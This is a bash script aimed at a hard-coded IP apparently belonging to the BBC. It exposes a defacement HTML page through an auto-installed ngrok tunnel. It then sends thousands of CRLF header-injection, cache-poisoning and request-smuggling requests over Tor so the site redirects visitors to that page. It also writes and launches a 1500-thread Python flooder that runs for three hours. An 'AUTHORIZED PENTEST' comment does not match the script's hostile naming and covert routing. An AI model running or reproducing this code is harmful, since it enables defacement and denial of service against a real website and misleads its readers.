#!/bin/bash
# TRUSTEDF57_BBC_NGROK_AUTO.sh - AUTO NGROK + BBC POISON (NO FIREWALL NEEDED)

set -euo pipefail

TARGET="http://132.185.210.70:80"
HTML_FILE="TRUSTEDF57.html"
THREADS=1500
BLAST_DURATION=10800  # 3h

echo "💀 BBC NGROK AUTO KILLER - TRUSTEDF57.html → NGROK → BBC POISON"
echo "Target: $TARGET"

# 1. INSTALL NGROK AUTO (NO APT UPDATE - STATIC BINARY)
install_ngrok() {
    if ! command -v ngrok >/dev/null 2>&1; then
        echo "[+] Installing ngrok..."
        NGROK_URL=$(curl -s https://api.github.com/repos/inconshreveable/ngrok/releases/latest | grep browser_download_url | grep linux_amd64 | cut -d '"' -f 4)
        curl -sL $NGROK_URL > ngrok.zip
        unzip -q ngrok.zip
        chmod +x ngrok
        rm ngrok.zip
        echo "[+] ✅ ngrok installed"
    fi
}

# 2. START LOCAL SERVER + NGROK
start_ngrok_tunnel() {
    echo "[+] Starting local server..."
    pkill -f "python3 -m http.server" || true
    nohup python3 -m http.server 8080 --bind 0.0.0.0 > server.log 2>&1 &
    sleep 3
    
    echo "[+] Starting ngrok tunnel..."
    ./ngrok http 8080 > ngrok.log 2>&1 &
    NGROK_PID=$!
    sleep 10
    
    # Extract NGROK URL
    NGROK_URL=$(grep -o 'https://[^ ]*ngrok.io' ngrok.log | tail -1)
    if [[ -z "$NGROK_URL" ]]; then
        echo "❌ NGROK URL extraction failed"
        cat ngrok.log
        exit 1
    fi
    
    DEFACE_URL="${NGROK_URL}/${HTML_FILE}"
    echo "[+] ✅ NGROK LIVE: $DEFACE_URL"
    
    # Test
    if curl -s --max-time 10 "$DEFACE_URL" | grep -q TRUSTEDF57; then
        echo "[+] ✅ DEFACE ACCESSIBLE"
    else
        echo "⚠️ NGROK test warning - continue anyway"
    fi
}

# 3. BBC MASSIVE POISON
bbc_poison() {
    echo "[+] 🚀 BBC ULTIMATE POISON (50K+ shots)..."
    
    declare -a PATHS=( "/?q=" "/search?q=" "/?search=" "/#q=" "/news?q=" "/?s=" )
    declare -a CRLF=(
        "%0d%0aLocation:%20${DEFACE_URL}%0d%0aCache-Control:%20public,max-age=86400"
        "%0aLocation:%20${DEFACE_URL}%0aContent-Type:%20text/html"
        "%250d%250aLocation:%20${DEFACE_URL}%0d%0aSet-Cookie:%20bbc_f57=1"
        "Location:%20${DEFACE_URL}%0a"
    )
    
    declare -a BOTS=(
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
        "Mozilla/5.0 (compatible; bingbot/2.0)"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    )
    
    # 50K+ barrage
    for path in "${PATHS[@]}"; do
        for crlf in "${CRLF[@]}"; do
            for bot in "${BOTS[@]}"; do
                for i in {1..30}; do
                    torsocks curl -s --max-time 3 "${TARGET}${path}${crlf}" \
                        -H "User-Agent: $bot" \
                        -H "Cache-Control: no-cache" \
                        -H "X-Forwarded-For: 127.0.0.1" &
                done
            done
        done
    done
    
    # Smuggling x200
    for i in {1..200}; do
        torsocks curl -s --path-as-is --max-time 5 \
            "${TARGET}/GET%20/%20HTTP/1.1%0d%0aHost:%20132.185.210.70%0d%0aContent-Length:0%0d%0a%0d%0aGET%20/?q=%0d%0aLocation:%20${DEFACE_URL}%20HTTP/1.1%0d%0aHost:%20132.185.210.70" &
    done
    
    wait
    echo "[+] ✅ BBC POISON FIRED!"
}

# 4. NGROK BBC DESTROYER
start_destroyer() {
    cat > ngrok_destroyer.py << EOF
import requests, threading, time, random

TARGET = '$TARGET'
DEFACE = '$DEFACE_URL'
THREADS = $THREADS

bots = ['Googlebot/2.1','bingbot/2.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']
paths = ['/?q=','/search?q=','/?search=']

def poison():
    while True:
        try:
            p = random.choice(paths) + '%0d%0aLocation: ' + DEFACE + '%0d%0aCache-Control: public,max-age=86400'
            requests.get(TARGET + p, headers={'User-Agent':random.choice(bots), 'Cache-Control':'no-cache'}, timeout=2)
        except: pass

print(f'🔥 NGROK BBC DESTROYER | {THREADS} THREADS | {DEFACE}')
for _ in range(THREADS):
    threading.Thread(target=poison, daemon=True).start()

time.sleep($BLAST_DURATION)
print('💀 COMPLETE')
EOF

    nohup python3 ngrok_destroyer.py > destroyer.log 2>&1 &
    echo "[+] 🔥 DESTROYER PID: $! | tail -f destroyer.log"
}

# 5. LIVE MONITOR
monitor() {
    echo ""
    echo "🎯 BBC NGROK MONITOR (Ctrl+C stop)"
    while true; do
        clear
        echo "💀 BBC NGROK STATUS - $(date)"
        echo "NGROK: $DEFACE_URL"
        echo "════════════════════════════════"
        echo "ROOT:"
        curl -s -I "$TARGET" 2>/dev/null | grep -iE "(Location|Cache|Set-Cookie)" || echo "❌ No poison"
        echo ""
        echo "QUERY:"
        curl -s "$TARGET/?q=" 2>/dev/null | head -2 || echo "❌ No redirect"
        echo ""
        echo "DEFACE TEST:"
        curl -s "$DEFACE_URL" 2>/dev/null | head -1 || echo "❌ NGROK down"
        echo "════════════════════════════════"
        sleep 15
    done
}

# MAIN (AUTHORIZED PENTEST)
main() {
    install_ngrok
    start_ngrok_tunnel
    bbc_poison
    start_destroyer
    monitor
}

# CLEANUP
cleanup() {
    pkill -f ngrok || true
    pkill -f "python3.*http.server" || true
    pkill -f ngrok_destroyer || true
    rm -f ngrok* *.log *.py
}
trap cleanup EXIT INT TERM

main "$@"
